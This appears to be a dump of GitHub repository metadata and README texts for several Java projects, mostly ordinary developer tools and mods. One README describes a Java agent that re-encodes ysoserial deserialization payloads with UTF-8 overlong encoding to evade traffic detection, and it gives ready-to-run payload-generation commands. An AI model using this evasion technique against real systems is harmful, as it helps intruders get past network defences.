| 影视 | 在线之家 | https://www.zxzja.com |
| 影视 | 555电影 | https://5look.site |",使用jsoup爬取一些影视网站数据内容编写的第三方应用。,"android,java,jsoup",2024-04-03T11:58:56Z,2024-07-15T03:03:04Z,2024-06-03T09:21:24Z,5,1,0,14,0,1,50,1,0,MIT,Java
aizuda/doc-apis,main,"<p align=""center"">
  <a href=""https://en.doc-apis.com/"">
   <img alt=""Doc-Apis-Logo"" src=""https://iknow.hs.net/e21b7ba1-949f-499d-8c29-2b3eb2ec3fd4.png"">
  </a>
</p>

<p align=""center"">
  Zero-intrusive, zero-code interface documentation auto-generation and one-click debugging framework.
</p>

<p align=""center"">
  <a href=""https://search.maven.org/search?q=g:com.doc-apis%20a:*"">
    <img alt=""maven"" src=""https://img.shields.io/github/v/release/xpc1024/doc-apis?include_prereleases&logo=xpc&style=plastic"">
  </a>
  <a href=""https://www.apache.org/licenses/LICENSE-2.0"">
    <img alt=""code style"" src=""https://img.shields.io/badge/license-Apache%202.0-4EB1BA.svg?style=flat-square"">
  </a>
  <a href=""https://www.gnu.org/licenses/agpl-3.0.html"">
    <img alt=""code style"" src=""https://img.shields.io/badge/license-AGPL 3.0%20-4EB1BA.svg?style=flat-square"">
  </a>
</p>

## What is Doc-Apis?

A foolproof, non-intrusive, code-free framework for automatic generation of API documentation with one-click debugging.

## Official website

**doc-apis website**  https://en.doc-apis.com

**dic-apis github** https://github.com/aizuda/doc-apis

**dic-apis gitee** https://gitee.com/aizuda/doc-apis

**aizuda website** https://aizuda.com/home

**aizuda gitee homepage** https://gitee.com/aizuda

**dromara website** https://dromara.org

**dromara gitee homepage** https://gitee.com/dromara


## Links
- [中文版](https://github.com/xpc1024/doc-apis/blob/main/README_ZH.md)
- [Samples](https://github.com/xpc1024/doc-apis/tree/main/doc-apis-test)
- [Demo in Springboot](https://en.easy-es.cn/pages/658abb/#_2-pom)

## Features

- **Zero Intrusion:** Unlike frameworks like Swagger, which require additional business code to generate documentation, doc-apis generates API documentation automatically as long as your code complies with standards.
- **Zero Configuration:** For Springboot projects, it takes as few as 0 lines of configuration to automatically generate API documentation. All configurations are designed for ease of use and come with default values, allowing you to configure as needed.
- **Transparent Dependency:** After introduction, it remains completely transparent to the original project without any impact. There's no need to worry about extra risks brought about by introducing third-party dependencies since it doesn't even need to be packaged into the project.
- **Agile Development:** No need to implement the interface; merely define the URL, type, and input/output parameters of the request to generate documentation, facilitating swift development for both front-end and back-end teams.
- **Rich Content:** From request URLs to methods, input and output parameters, all necessary information such as parameter types, mandatory status, and descriptions are clearly presented.
- **Diverse Formats:** Generates various formats such as HTML and MD in one go, simultaneously compatible with WEB, iOS, Android, and other types, adapting to various scenarios.
- **Broad Compatibility:** Whether it's mainstream SpringBoot projects, Spring projects, or niche Jfinal, Play frameworks, etc., compatibility is assured.
- **Powerful Features:**  Supports online debugging, multiple request methods, custom headers, and more, covering all your needs for API documentation and testing in one place.
- **Multi-language** Generates multi-lingual API documentation, with user documentation currently supporting Chinese and English. Contributions for other languages are welcome.
- **Good Compatibility:** Works well with JDK versions from 8 to 21, and SpringBoot from 1.x to 3.x. Compatibility is ensured across all versions for Spring, Jfinal, and other projects.
- **Code Conformity:** Monitors code quality from the source. Unannotated modules and non-Restful style interfaces are clearly identified, encouraging developers to standardize their code.
- **Ease of Use:** Like high-quality ingredients requiring simple cooking, a sophisticated documentation generation framework requires simple operations. From beginner to expert, you can master it in 0 to 5 minutes.
- **Continuous Updates:** ...
-   ...

## Preview
![image](https://github.com/user-attachments/assets/12f9b637-4377-4b6e-ac15-b87562d539a0)
![image](https://github.com/user-attachments/assets/abe8c48e-5ff3-4645-bd06-87538abc87c1)
![image](https://github.com/user-attachments/assets/b8931051-d59b-4caa-8b6d-6effca7bcff7)
![image](https://github.com/user-attachments/assets/a059bc5c-ae88-4136-b37c-204fd50af15b)
<br/>

## Advertising provider

<a href=""https://www.mingdao.com?s=utm_206&utm_source=doc-apis&utm_campaign=IT%E7%BD%91%E7%AB%99&utm_content=%E6%B3%A8%E5%86%8C%E4%BD%93%E9%AA%8C
"">
  <img alt=""ad"" src=""https://iknow.hs.net/00b4a54c-6505-4776-9232-f0a9d9768fac.jpg"">
</a>

</br>

<a href=""https://fastbee.cn/"">
  <img alt=""ad"" src=""https://iknow.hs.net/b0592c71-5a41-427e-8d47-fcba4b399d02.png"">
</a>

<br/>

## Donate
[Donate doc-apis](https://en.doc-apis.com/pages/fb599d/)


## License

Doc-apis is under the Apache 2.0 license and AGPL-3.0 license.
","Zero-intrusive, zero-code interface documentation auto-generation and one-click debugging framework",,2024-04-20T10:21:52Z,2024-08-13T06:39:51Z,2024-07-17T13:44:05Z,1,7,8,21,4,11,49,1,0,AGPL-3.0,Java
khiner/CrosswordFiller,main,"# Crossword filler

One of the first programs I ever wrote - a program to find valid English crossword fills given a grid pattern with optional partial completions.

This project came to mind recently and I looked around on the Wayback Machine.
Turns out I posted the jar on MediaFire and linked to it on an old blog on Jan 2, 2011, and it's [still there](https://www.mediafire.com/file/rwpl49xusm55s2a/WordFillVer2.jar).
I downloaded and opened it on my 2023 MacBook Air, and it ran!
Since it's Java, I'm guessing it runs on other computers, too :)

I'm pretty sure I never put the source code online (looks like my first GH commit was almost a year later in [Dec 2011](https://github.com/khiner/AI-Challenge-2011/commit/9cd23268070eceb859ce34083a6f6ae25e9c7ac7)), but [David Walton](https://github.com/diggernet) used the [Enhanced Class Decompiler](https://marketplace.eclipse.org/content/enhanced-class-decompiler) Eclipse plugin, configured to use the Procyon decompiler, to recover something similar to the original source. (Thanks, David!)

Here are my vague recollections from over 13 years ago:
* It uses [beam search](https://en.wikipedia.org/wiki/Beam_search).
* Written in Java. Looking at [the releases](https://www.java.com/releases/), version 6 was the latest at the time.
* UI is Java Swing
* If I remember correctly, it doesn't render _every_ guess on the screen, but rather every N guesses, where N < 10, since the vast majority of time was spend rendering compared to searching.
* For some reason it is very, very yellow (ah simpler times 😅)

![](ScreenRecording.gif)

[Download the jar file](https://github.com/khiner/CrosswordFiller/raw/main/WordFillVer2.jar) and have a blast all weekend long 🤪

Or, to compile and run the decompiled source:
```shell
$ javac Display.java
$ java Display
```
",One of the very first programs I ever made - a program to find valid english crossword fills given a grid pattern using beam search. I found as a jar file using the Wayback Machine!,,2024-04-27T04:02:54Z,2024-04-29T22:23:52Z,,0,3,2,8,0,2,49,1,0,CC0-1.0,Java
eternity-oop/DDD-essence-part2,main,## 도메인주도 설계의 사실과 오해 파트2 예제,도메인 주도 설계의 사실과 오해 파트 2 예제,,2024-04-20T15:44:08Z,2024-04-29T16:00:04Z,,0,2,0,4,0,26,49,1,0,,Java
NingNing0111/know-hub-ai,master,"## 项目介绍

&emsp;[know-hub-ai](https://github.com/NingNing0111/know-hub-ai)是一款采用[RAG 技术](https://www.promptingguide.ai/zh/techniques/rag)实现的个人知识库 AI 问答系统，本项目适配 OpenAI 接口，因此可搭配[One-API](https://github.com/songquanpeng/one-api)实现大语言模型的统一调用。

&emsp;🌟🌟**请将本项目视为一个 Spring AI 和 RAG 技术的学习项目，本项目重在介绍 Spring AI 的使用以及结合向量数据库实现 RAG 技术的实现**。

## 项目功能

- [x] 知识库上传，支持：**pdf、doc、txt、md、excel**等文件格式
- [x] 支持两种方式的 AI 对话：RAG 和 Simple
  - RAG：对话前会检索知识库作为上下文，AI 可以根据检索出的知识库内容进行回复；
  - Simple：普通对话
- [x] 聊天配置：可设置最大聊天历史长度、对话模型、对话方式、系统提示词等
- [x] API 管理：添加或删除 API
- [x] AI 绘图(Dall-e-\*)系列
- [x] 对象存储：知识库的文件存储在云上，目前选定开源软件[Minio](https://github.com/minio/minio)作为对象存储平台
- [x] 知识库下载：基于对象存储的实现

## 开发计划

- [ ] 基于语音输入实现对话

- [ ] Api 分类管理：（embedding、image、chat 等三类模型），接口统一为 OpenAI

- [ ] MJ 绘图

- [ ] 桌面应用端开发

- [ ] 多用户的后端服务

## 功能模块图

![](doc/images/know-hub-ai-功能模块图.png)

## 工作原理

![](doc/images/know-hub-ai-工作原理.png)

## 技术栈

### 前端

- node >= 18
- Vue3 + TS + ElementPlus + Pinia

### 后端

- JDK >= 17
- Spring Boot 3.x
- Spring AI 0.8.1
- pgvector 0.5.0

## 效果图

### 知识库管理

> 支持：PDF、doc、md、excel 等

![alt text](./doc/images/know-hub.png)

### 正常对话(不使用知识库)

![alt text](./doc/images/no-rag.png)

![alt text](./doc/images/no-rag-1.png)

### RAG 对话(使用知识库)

![alt text](./doc/images/rag.png)

![alt text](./doc/images/rag-1.png)

### AI 绘画

![alt text](./doc/images/draw1.png)

![alt text](./doc/images/draw2.png)

### API 管理

![alt text](./doc/images/api-manage.png)

### 设置中心

![alt text](./doc/images/settings.png)

## 部署指南

&emsp;Mac M1 环境(ARM)，使用`docker-compose-mac.yml`一键本地部署

```shell
docker compose -f docker-compose-mac.yml up -d
```

&emsp;Linux(AMD)使用`docker-compose.yml`一键部署

```shell
docker compose up -d
```

### 说明

&emsp;若只想搭建项目环境，可以使用这个[docker-compose.yml](https://github.com/NingNing0111/know-hub-ai/blob/master/know-hub-ai-backend/env/docker-compose.yml)文件，执行下述命令即可部署 pgvector 和 minio：

```
docker compose up -d
```

&emsp;项目采用 Spring Data JPA 作为 ORM 框架，本地开发时，可通过在`application.yml`文件中配置`spring.jpa.hibernate.ddl-auto`为`create`(项目下载后默认配置)即可在 SpringBoot 启动时自动创建表。

## 其它

- knife4j 接口文档：[http://localhost:8329/doc.html](#)
",Spring AI and PGVector 基于个人知识库的AI问答系统,,2024-04-02T15:39:13Z,2024-07-18T15:36:49Z,,0,4,4,73,1,18,47,2,0,,Java
Interlink-Media/Sierra,master,"<!-- PROJECT SHIELDS -->
[![Contributors][contributors-shield]][contributors-url]
[![Forks][forks-shield]][forks-url]
[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]

<h3 align=""center"">Sierra</h3>

<p align=""center"">
  Packet Analysis Tool for the Minecraft Protocol by Feelix.
  <br />
  <a href=""https://github.com/Interlink-Media/Sierra/issues"">Report Bug</a>
  ·
  <a href=""https://github.com/Interlink-Media/Sierra/issues"">Request Feature</a>
</p>

<p align=""center"">
  This project is based on https://github.com/jtJava/Titanium
  <br>
  <a href=""https://sierra.squarecode.de/sierra"">More information about Sierra can be found here</a>
</p>

<!-- MARKDOWN LINKS & IMAGES -->
[contributors-shield]: https://img.shields.io/github/contributors/Interlink-Media/Sierra.svg?style=for-the-badge
[contributors-url]: https://github.com/Interlink-Media/Sierra/graphs/contributors
[forks-shield]: https://img.shields.io/github/forks/Interlink-Media/Sierra.svg?style=for-the-badge
[forks-url]: https://github.com/Interlink-Media/Sierra/network/members
[stars-shield]: https://img.shields.io/github/stars/Interlink-Media/Sierra.svg?style=for-the-badge
[stars-url]: https://github.com/Interlink-Media/Sierra/stargazers
[issues-shield]: https://img.shields.io/github/issues/Interlink-Media/Sierra.svg?style=for-the-badge
[issues-url]: https://github.com/Interlink-Media/Sierra/issues
[license-shield]: https://img.shields.io/github/license/Interlink-Media/Sierra.svg?style=for-the-badge
[license-url]: https://github.com/Interlink-Media/Sierra/blob/master/LICENSE.txt
[product-screenshot]: images/screenshot.png
","Sierra is an open-source anti-crash system against Spigot crashers at the Netty level. It has been primarily developed for Spigot 1.21, but is backwards compatible up to version 1.8. Version 1.7.10 is not supported. Supporting Paper based forks and Folia.",,2024-04-09T11:44:37Z,2024-09-23T15:04:13Z,2024-09-18T14:48:52Z,63,1,16,472,0,1,47,2,0,GPL-3.0,Java
WilloIzCitron/ArchiveDustry-Java,master,"
![Archivedustry logo](/assets/sprites-override/ui/logo.png)

[![Build Mod](https://github.com/WilloIzCitron/ArchiveDustry-Java/workflows/Build%20Mod/badge.svg)](https://github.com/WilloIzCitron/ArchiveDustry-Java/actions?query=workflow:""Build+Mod"")
[![GitHub release](https://img.shields.io/github/v/tag/WilloIzCitron/ArchiveDustry-Java?filter=%21server-%2A)](https://github.com/WilloIzCitron/ArchiveDustry-Java/releases/)
[![License](https://img.shields.io/badge/License-MIT-blue)](https://github.com/WilloIzCitron/ArchiveDustry-Java/blob/master/LICENSE)
[![issues - ArchiveDustry-Java](https://img.shields.io/github/issues/WilloIzCitron/ArchiveDustry-Java)](https://github.com/WilloIzCitron/ArchiveDustry-Java/issues)
[![Stars - ArchiveDustry-Java](https://img.shields.io/github/stars/WilloIzCitron/ArchiveDustry-Java)](https://github.com/WilloIzCitron/ArchiveDustry-Java/stargazers)
[![GitHub followers of WilloIzCitron](https://img.shields.io/github/followers/WilloIzCitron)](https://github.com/WilloIzCitron)

> [!NOTE]
> This Mod was being migrated from JS<sup>JavaScript</sup> was being archived, this mod are almost perfect.

> [!TIP]
> Language: English (you can choose your language readme at i18n directory)

A mod that override the vanilla soundtrack into Blue Archive Soundtrack, and also adds the cosmetics for units such as halo. This mod is unaffiliated with developer of  Blue Archive game: Nexon, NAT GAMES and Yostar.

## Music List
  - menu.ogg = Constant Moderato & RE Aoharu (You can set it at setting)
  - launch.ogg = ~~Connected Sky~~ Shooting Stars
  - game1.ogg = Rolling Beat
  - game2.ogg = Acceleration
  - game3.ogg = KIRISAME
  - game4.ogg = Midnight Trip
  - game5.ogg = Sakura Punch
  - game6.ogg = Formless Dream
  - game7.ogg = Vivid Night
  - game8.ogg = Crucial Issue
  - game9.ogg = KARAKURhythm
  - editor.ogg = Mischievous Step
  - land.ogg = Aoharu (Intro Sampling)
  - boss1.ogg = ~~Tech N Tech~~ Endless Carnival
  - boss2.ogg = Out of Control
  - fine.ogg = Alkaline Tears
  - lose.ogg (additional) = Fade Out
  - win.ogg (additional) = Party Time
  - research.ogg (additional) = Future Lab
  - database.ogg (additional) = Future Bossa
  - loadout.ogg (additional) = MX Adventure
  - and more...

## Building

To generate the mod jar, you can do this below with platform specified jar:
- Android: `gradlew jarAndroid`
- PC: `gradlew jar`

for Build Deployment(desktop and android) you can do `gradlew build`

## Bleeding Edges(Snapshot)
Every BE(Snapshot) builds was generated via Actions, you can check on Actions section and select the specific workflow,
then download the artifact on the workflow runs

## Star History

<a href=""https://star-history.com/#WilloIzCitron/ArchiveDustry-Java&Date"">
 <picture>
   <source media=""(prefers-color-scheme: dark)"" srcset=""https://api.star-history.com/svg?repos=WilloIzCitron/ArchiveDustry-Java&type=Date&theme=dark"" />
   <source media=""(prefers-color-scheme: light)"" srcset=""https://api.star-history.com/svg?repos=WilloIzCitron/ArchiveDustry-Java&type=Date"" />
   <img alt=""Star History Chart"" src=""https://api.star-history.com/svg?repos=WilloIzCitron/ArchiveDustry-Java&type=Date"" />
 </picture>
</a>

## Credits
- Music: Nor, Mitsukiyo and KARUT
",Blue Archive Soundtracks and Cosmetics in Mindustry,"bluearchive,mindustry-mod-v7,java,cosmetics,soundtrack,mindustry-mod,blue-archive",2024-04-15T05:30:31Z,2024-07-21T07:10:46Z,2024-06-24T12:02:14Z,8,9,4,231,0,3,46,1,1,MIT,Java
rahulkrishy/CPT_Java,main,"# Welcome to the CPT(Concepts-Practices-Tasks)_Java Programming Language Learning Guide! 👨🏻‍💻🚀
---
## 📚 About This Repository
✧ Explore Java from basics to advanced Concepts. <br>

## 📋 Table of Contents
1. [Java_Concepts](#java_concepts)  
2. [Java_Practices](#java_practices)  
3. [Java_Tasks](#java_tasks)  
---
## 📖 Repository Content

### Java_Concepts:

- **Basic:**
   - `_Intro`
   - `_HelloWorld`
   - `DataTypes`
   - `AccessModifier`
   - `ConditionalStatements`
   - `SwitchCase`
   - `TernaryOperator`
   - `ControlFlow`
   - `ReadingUserinput`
   - `Constructor`
   - `MethodOverloading`
   - `ObjectClassConcept`
   - `NestedClass`
   - `GenericClass`
   - `StaticConcepts`
   - `Stack_vs_Heap`
   - `Up_down_Casting`
   - `AnonymousObject`
   - `EnumConcept`
   - `ExceptionHandlingConcept`
   - `RegexConcept`

- **Array:**
   - `Array`
   - `Array_2D`
   - `Array_ArrayOfObjects`

- **String:**
   - `StringConcepts`

- **OOPS (Object-Oriented Programming):**
   - `OopsConcepts`
   - `Oops_Encapsulation`
   - `Oops_Inheritance`
   - `Oops_Inheritance_Single`
   - `Oops_Inheritance_MultiLevel`
   - `Oops_Inheritance_Hierarchical`
   - `Oops_Inheritance_Hybrid`
   - `Oops_Abstraction`
   - `Oops_Polymorphism`
   - `Overloading_vs_OverRiding`
   - `ThisKeyword`
   - `This_vs_Super`
   - `FinalKeyword`
   - `StreamConcept`
   - `DateClass`

- **Interface:**
   - `InterfaceConcept`
   - `InterfaceTypes`

- **Collection:**
   - `CollectionConcept`
   - `Collection_List_Interface`
   - `Collection_Set_Interface`
   - `Collection_Map_Interface`
   - `Collection_Queue_Interface`
   - `Comparable_vs_Comparator`
 
- **PackageConcept:**
   - `Basic_PackageConcepts`
   - `AccessModifier_PackageConcept`

- **Thread:**
   - `ThreadConcept`

- **DSA (Data Structures and Algorithms):**
   - `Algorithm_BinarySearch`

---

### Java_Practices:
- `Stay Tuned...▶️`

---

### Java_Tasks:
Project-based tasks to reinforce Java concepts.

---

## 📢 Stay Tuned for More Updates!

I'm continuously adding new concepts, tasks, and exercises to this repository. If you have any feedback or suggestions to improve it, feel free to share your thoughts. Stay tuned for updates, and until then, keep practicing. Greets! ✌🏻

---
## 📜 License
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
",Java Programming Learnings,,2024-04-26T12:02:35Z,2024-09-19T15:01:29Z,,0,1,0,26,0,0,46,1,0,MIT,Java
hebian1994/cloud2024,master,,,,2024-04-09T13:56:18Z,2024-04-04T13:51:14Z,,0,1,0,42,0,10,43,4,0,,Java
Ar3h/utf8-overlong-agent,main,"# utf8 overlong agent

使用 agent 替换`writeUTF`和`writeUTFBody`函数，从而在序列化时生成utf8 overlong数据，绕过流量层检测。



# 用法

在生成反序列化payload工具启动时添加 javaagent 参数即可

```bash
java -javaagent:/path/to/utf8-overlong-agent-1.0-SNAPSHOT-jar-with-dependencies.jar -jar ysoserial-0.0.5-all.jar CommonsCollections5 ""touch /tmp/success""
```



![image-20240423164153836](./assets/image-20240423164153836.png)



可以使用base64编码一下，然后拷贝出来使用

![image-20240423164533367](./assets/image-20240423164533367.png)



默认采用随机混合2、3字节的utf8 overlong编码，每次生成的payload都不一样

![image-20240423164808031](./assets/image-20240423164808031.png)



若想固定使用2或3字节utf8 overlong，指定agent参数即可：

```bash
# 2 byte
java -javaagent:/path/to/utf8-overlong-agent-1.0-SNAPSHOT-jar-with-dependencies.jar=2 -jar ysoserial-0.0.5-all.jar CommonsCollections5 ""touch /tmp/success""

# 3 byte
java -javaagent:/path/to/utf8-overlong-agent-1.0-SNAPSHOT-jar-with-dependencies.jar=3 -jar ysoserial-0.0.5-all.jar CommonsCollections5 ""touch /tmp/success""
```





# 参考
https://xz.aliyun.com/t/14300

https://en.wikipedia.org/wiki/UTF-8

https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html

https://github.com/Whoopsunix/utf-8-overlong-encoding

https://t.zsxq.com/ToFaL

https://t.zsxq.com/Yg2cc
", 使用 agent 实现反序列化 utf8 overlong,,2024-04-23T09:13:20Z,2024-04-24T09:42:14Z,2024-04-23T09:12:47Z,1,1,0,5,0,6,42,1,0,,Java
lhccong/sql-slow-mirror,master,"<p align=""center"">
    <a href="""" target=""_blank"">
      <img src=""./docs/imgs/icon.jpg"" width=""280"" />
    </a>
</p>
<h1 align=""center"">SQL 慢镜 - SQLSlowMirror</h1>
<p align=""center""><strong>一个旨在帮助系统快速分析慢 SQL 的工具。<br>无论你是开发者还是运维人员，SQL 慢镜都将成为你的最佳伙伴。<em>持续更新中～</em></strong></p>
<div align=""center"">
    <a href=""""><img src=""https://img.shields.io/badge/github-项目地址-yellow.svg?style=plasticr""></a>
    <a href=""""><img src=""https://img.shields.io/badge/前端-项目地址-blueviolet.svg?style=plasticr""></a>
</div>



## 背景

大促备战，最大的隐患项之一就是慢 SQL，带来的破坏性最大，也是日常工作中经常带来整个应用抖动的最大隐患，而且对 SQL 好坏的评估有一定的技术要求，有一些缺乏经验或者因为不够仔细造成一个坏的 SQL 成功走到了线上，等发现的时候要么是造成了线上影响、报警、或者后置的慢 SQL 采集发现，这时候一般无法快速止损，需要修改代码上线、或者调整数据库索引。

1、无法提前发现慢 SQL，可能恶化为慢 SQL 的语句

2、线上出现慢 SQL 后，无法快速止损



项目参考了京东开源项目：**[sql-analysis](https://github.com/jd-opensource/sql-analysis)**



## 功能&设计🚀

![sqlPic](docs/imgs/sqlPic.png)

```txt
sql-slow-mirror-core SQL 慢镜组件核心代码
├─analysis	--SQL执行分析模块
├─config	--配置文件的存放
├─core	--负责组件的接入到 mybatis 以及流程调用
├─extract	--负责完整 SQL 的提取模块
├─out	--输出结果模块
├─rule	--规则引擎执行模块
├─utils	--工具类存放模块
└─score	--评分模块

sql-slow-mirror-sample --[示例]示例 demo 可直接使用
```

### 功能：

1. 对 Mybatis 中的执行 SQL 解析
2. 分析 SQL 的执行计划
3. 通过规则引擎将执行计划进行解析并输出

## 快速开始🌈

### 启动示例

**方式一**：使用本项目中的测试用例

1. 将项目克隆到本地

   ```
   git clone https://github.com/lhccong/sql-slow-mirror
   ```

2. IDEA打开项目

   使用 IDEA 打开，等待项目初始化完成。

3. 执行 sql-analysis-samples 项目中的测试用例，查看控制台输出的分析日志

![image-20240416162922123](docs/imgs/sqlAnalysis.png)



### 使用方法

#### 1、引入依赖

```xml
<dependency>
    <groupId>com.cong.sql.slow.mirror</groupId>
    <artifactId>sql-slow-mirror-core</artifactId>
    <version>1.0-SNAPSHOT</version>
</dependency>
```

#### 2、配置 yml

```yml
spring:
  datasource:
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://localhost:3306/需要分析的数据库?useSSL=false&useUnicode=true&characterEncoding=utf-8&serverTimezone=Asia/Shanghai&allowPublicKeyRetrieval=true
    username: root
    password: root
sql:
   slow:
      mirror:
         analysisSwitch: true #是否开启 SQL 分析
#         onlyCheckOnce: true  #是否只分析一次
#         checkInterval: 300000  #分析间隔 只有 onlyCheckOnce 为 false 的时候才有效
#         exceptSqlIds: com.cong.example.mapper.TaskMapper.selectList,com.cong.example.mapper.TaskMapper.xxx #不需要分析的 SQL ID
#         sqlType: SELECT,UPDATE #拦截的 SQL 类型
#         outModel: LOG #日志模型 默认就是系统的 log 打印
#         outputClass: com.cong.example.out.MySqlScoreResultOutService #要自定义输出的时候再打开
```

|                |                                            |          |                    |                             |
| -------------- | ------------------------------------------ | -------- | ------------------ | --------------------------- |
| 属性           | 用途                                       | 是否必填 | 默认值             | 备注                        |
| analysisSwitch | 是否开启分析功能                           | 是       | false              |                             |
| onlyCheckOnce  | 是否对一个sqlid只分析一次                  | 非       | true               |                             |
| checkInterval  | 每个sqlid分析间隔                          | 非       | 300000毫秒         | onlyCheckOnce 为false才生效 |
| exceptSqlIds   | 需要过滤不分析的sqlid                      | 非       |                    |                             |
| sqlType        | 分析的sql类型                              | 非       | 默认 SELECT,UPDATE |                             |
| outModel       | 默认输出方式                               | 非       | 默认值：LOG        |                             |
| outputClass    | 评分结果输出类，用于扩展自定义结果输出方式 | 非       |                    |                             |

#### 3、注入容器

```java
package com.cong.example.config;

import com.cong.sql.slowmirror.config.ConfigUtils;
import com.cong.sql.slowmirror.core.SqlAnalysisAspect;
import org.mybatis.spring.annotation.MapperScan;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import java.util.Properties;

/**
 * MyBatis Plus 配置
 *
 * @author <a href=""https://github.com/lhccong"">...</a>
 */
@Configuration
@MapperScan(""com.cong.example.mapper"")
public class MyBatisPlusConfig {

    /**
     * SQL分析方面
     *
     * @return {@link SqlAnalysisAspect}
     */
    @Bean
    public SqlAnalysisAspect sqlAnalysisAspect() {

        // 加载配置文件，此处加载的是名为""sql.slow.mirror""的配置
        Properties properties = ConfigUtils.loadConfig(""sql.slow.mirror"");

        // 创建SQL分析切面的实例
        SqlAnalysisAspect sqlAnalysisAspect = new SqlAnalysisAspect();

        // 将加载的配置属性设置到SQL分析切面实例中
        sqlAnalysisAspect.setProperties(properties);

        // 返回配置完毕的SQL分析切面实例
        return sqlAnalysisAspect;
    }



```

## 优势

1. 接入成本低：只需要设置好配置文件
2. 可扩展性好：能够通过自定义的方式来制定分析结果的输出
3. 性能：基于性能和不同的使用场景考虑，支持定制化配置，每个 SQL 是否仅进行一次检查、或者按某个时间间隔进行配置

### 贡献者

- [聪](https://github.com/lhccong) - 主要开发者

### 许可证

该项目采用 MIT 许可证。详细信息请参阅 [LICENSE](LICENSE) 文件。

### 联系方式

如有任何疑问或建议，欢迎联系项目主要开发者：

- 电子邮件: 771901874@qq.com

### 注意事项

- 本项目仅供学习和参考使用，未经授权请勿用于商业目的。
- 欢迎贡献代码或者提出建议，您可以通过提出 Issue 或者 Pull Request 的方式参与到项目中来。

## 参与贡献

如果您对项目有任何建议或想要贡献代码，欢迎提交 Issue 或 Pull Request。我们期待您的参与，共同完善和改进 SQL 慢镜项目！

---

感谢您对 SQL 慢镜项目的关注和支持！🕵️‍♀️",SQL 慢镜🔍分析工具旨在帮助开发人员🕵️‍♀️识别和解决 MyBatis 数据库操作中的性能瓶颈，🚀特别是那些导致应用程序变慢或资源消耗过高的慢 SQL 查询。,,2024-04-11T07:12:37Z,2024-08-13T00:09:24Z,,0,2,1,86,0,8,41,2,0,,Java
paynezhuang/panis-boot,main,"# PanisBoot 后台管理系统

![SpringBoot](https://img.shields.io/badge/Spring%20Boot-3.3-blue.svg)
![JDK](https://img.shields.io/badge/JDK-21+-blue.svg)
![Version](https://img.shields.io/badge/Version-1.0.4--SNAPSHOT-blue.svg)
[![License](https://img.shields.io/badge/License-Apache%20License%202.0-B9D6AF.svg)](./LICENSE)
<br/>
[![Author](https://img.shields.io/badge/Author-paynezhuang-green.svg)](https://github.com/paynezhuang)
[![Copyright](https://img.shields.io/badge/Copyright-2024%20Zhuang%20Pan%20@PanisBoot-green.svg)](https://github.com/paynezhuang)

### 项目简介

Panis: 名为 Pan , is Pan 反过来 `Panis`，同译为：面包。

[`PanisBoot`](https://github.com/paynezhuang/panis-admin) 是一款现代化的后台管理系统脚手架，它基于 Spring Boot 3
框架进行开发。也得益于前端 [`@SoybeanAdmin 1.0.0`](https://github.com/soybeanjs/soybean-admin)
发版后，精致的用户界面和一致的编码，所以得此顺势完善此项目。
在市面上虽然存在众多出色的 Java 后端管理系统框架，但还是决定重复再造一个轮子。

### 技术选型

| 技术           | 说明        | 版本         |
|:-------------|:----------|:-----------|
| Spring Boot  | 核心框架      | 3.3.2      |
| MyBatis-Plus | 持久层框架     | 3.5.6      |
| MySQL        | 数据库       | 8.0.35     |
| Redis        | 缓存        | 7.2.3      |
| Sa-Token     | 鉴权框架      | 1.38.0     |
| Logback      | 日志管理      | 1.5.6      |
| Knife4j      | 接口文档      | 4.5.0      |
| Lombok       | 工具库       | 1.18.34    |
| Jackson      | JSON解析    | 2.15.4     |
| Gson         | JSON解析    | 2.10.1     |
| Guava        | Google工具库 | 33.2.1-jre |
| Hutool       | 工具库       | 5.8.29     |

### 项目源码

| 名称      | 链接                                                                      |
|:--------|:------------------------------------------------------------------------|
| 前端      | [Panis-admin](https://github.com/paynezhuang/panis-admin)               |
| 后端      | [Panis-boot](https://github.com/paynezhuang/panis-boot)                 |
| 后端扩展依赖库 | [Panis-boot-starter](https://github.com/paynezhuang/panis-boot-starter) |

### 项目启动

##### 前置环境

* **Java** 开发环境 >=JDK 21
* **Java** 开发工具 IDEA
* **Maven** 构建依赖环境 >=3.9.6
* **MySQL** 数据库 >=8.0.35
* **Redis** 缓存数据库 >=7.2.3

##### 克隆项目

```bash
git clone https://github.com/paynezhuang/panis-boot
git clone https://github.com/paynezhuang/panis-boot-starter
```

##### 导入启动

1. 将`panis-boot`以及`panis-boot-starter`分别导出到IDEA中，等待 Maven 依赖下载完成
2. 创建数据库`panis_boot`，导入`panis-boot-doc`项目中的`panis_boot.sql`，文件[暂在QQ群获取](https://github.com/paynezhuang/panis-boot/issues/5)
3. 修改`panis-boot`项目中的`application-dev.yml`文件中的`数据库`以及`Redis`连接信息
4. 启动`PanisBootApplication`类
5. 看到`---[PanisBoot]-[panis-boot-admin]-启动完成，当前使用的端口:[9999]，环境变量:[mybatis,dev]---`即代表启动成功

### 项目结构

```
PanisBoot
├── panis-boot-common -- 基础模块
├── panis-boot-admin -- 后台管理模块
│   └── controller  -- 控制层
├── panis-boot-infrastructure -- 基础配置
├── panis-boot-modules -- 业务模块
│   └── system 
│       └── repository -- 数据交互
│           └── mapper -- 持久层
│       └── domain  -- 业务模型
│           └── entity -- 数据库实体
│           └── vo -- 视图对象
│           └── bo -- 业务对象
│           └── dto -- 传输对象
│       └── service -- 服务层
│           └── impl -- 服务实现层
│       └── facade -- 门面层
│           └── impl -- 门面实现层
│   └── base -- 基础管理
│   └── ... -- 其他模块
└── pom.xml -- 公共依赖
```

#### `common` 和 `infrastructure` 区别

* `common`模块：通常包含通用的工具类、异常定义、常量定义等与业务无关的代码。这些代码可以被整个应用程序共享。
    - 通用工具类，比如日期处理、字符串处理等
    - 通用异常定义，比如业务异常、参数校验异常等
    - 通用常量定义，比如状态码、错误信息等

* `infrastructure`模块：通常包含与基础设施相关的代码，比如数据库访问、缓存、消息队列、配置管理等。这些代码通常是为了支持业务模块的运行而存在的。
    - 数据访问相关的代码，比如数据库连接、ORM框架配置、数据源配置等
    - 缓存相关的代码，比如缓存配置、缓存管理等
    - 消息队列相关的代码，比如消息生产者、消费者配置等
    - 配置管理相关的代码，比如配置加载、动态配置更新等

对于静态类、工具类、异常定义等，你可以根据其功能和作用来判断放入`common`还是`infrastructure`
